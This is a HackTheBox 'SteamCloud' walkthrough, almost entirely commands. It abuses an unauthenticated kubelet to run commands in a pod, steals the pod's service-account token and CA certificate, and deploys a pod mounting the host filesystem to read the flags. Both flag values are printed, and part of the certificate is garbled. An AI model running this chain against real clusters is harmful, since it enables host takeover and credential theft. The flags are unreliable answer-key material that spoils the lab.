HTB - SteamCloud
```bash - kali
curl https://$TARGET:10250/pods -k
```
```bash - kali
git clone https://github.com/cyberark/kubeletctl
```
```bash - kali
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64
```
```bash - kali
chmod a+x ./kubeletctl_linux_amd64
```
```bash - kali
sudo mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```
```bash - kali
kubeletctl --server $TARGET pods
```
![[Pasted image 20220217212355.png]]
```bash - kali
kubeletctl --server $TARGET scan rce
```
![[Pasted image 20220217212432.png]]
```bash - kali
kubeletctl --server $TARGET exec "id" -p nginx -c nginx
```
```bash - kali
kubeletctl --server $TARGET exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
```
`eyJhbGciOiJSUzI1Ni.....`
```bash - kali
kubeletctl --server $TARGET exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
```
```
..
—-—-—---BEGIN CERTIFICATE-----
MIIDBjCCAe6gAWIBAgIBATANBgkqhkiGO9w@BAQs FADAVMRMWEQYDVQQDEwptawsp a3ViZUNBMB4XDTIXMTEYOTEYMTY1NVOXDTMXMTEYODEYMTY1NVowFTETMBEGA1UE AXMKbWluawWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOOa YRSqoSUfHaMBK44xXLLUFXNELhJrC/900R2Gpt8DuBNIWSve+mgNxbOLTofhgQoM HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7MOX0QjPRB3Ug2cID7 degATtnjZaXTkoVUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR10x09+mPo3ry6S2xqG VeeRhpK6Ma3FpJB30oN0OKz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmk fgYORyg990 1pRrbLrfNk6DE5S9VSUCAWEAAaNhMF8wDgYDVROPAQH/BAQDAgKKMBOGA1Ud JQQW MBQGCCsGAQUFBWMCBggrBgEFBQCcDATAPBENVHRMBAf8EBTADAQH/MBOGA1UdDgQW BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiGO9w@BAQs FAAOCAQEAQjqg5pUm 1t1jIeLKYT1E6C5XxykWOX8mOWzmok17rSMA2GYISqdbRcw72aocvdGI2Z78X/HyO e/ UETZ RS AVE & R {ora Akl b B £ 7 p AT o & VA L\VEEE EVES T B ba ] : 131 B VS 9MGEdIpuHqZ15HHYeZ83SQWc jOHO1ZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D XpCIgRAWOIUgK74EdYNZAkrWuSOAQUa8KiKuhklyZv383ib3FvAo4JrBX1Sjw/RO JWSyodQkEF60Xh7yd21RFhtyE8J+h1HeTz4FpDJI7MuvfXfoXxSDQOYNQuU@9iFiMz kf2eZIBNMpOTFg==
—————END CERTIFICATE----—-
```
```bash - kali
export token="eyJhbGciOiJSUzI1Ni....."
```
Save the ca.crt output to a file named "ca.crt"
```bash - kali
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:443 get pods
```
```bash - kali
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:443 auth can-i --list
```
---
f.yaml
```yaml - kali
apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
---
```bash - kali
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:443 apply -f f.yaml
```
```bash - kali
kubectl --token=$token --certificate-authority=ca.crt --server=https://$TARGET:443 get pods
```
```bash - kali
kubeletctl --server $TARGET exec "cat /root/home/user/user.txt" -p nginxt -c nginxt
```
==f1561ae2cc46d3da137f8fc0a9e6ed9f==
```bash - kali
kubeletctl --server $TARGET exec "cat /root/root/root.txt" -p nginxt -c nginxt
```
==fe4607da38330e4c2281fe512417640b==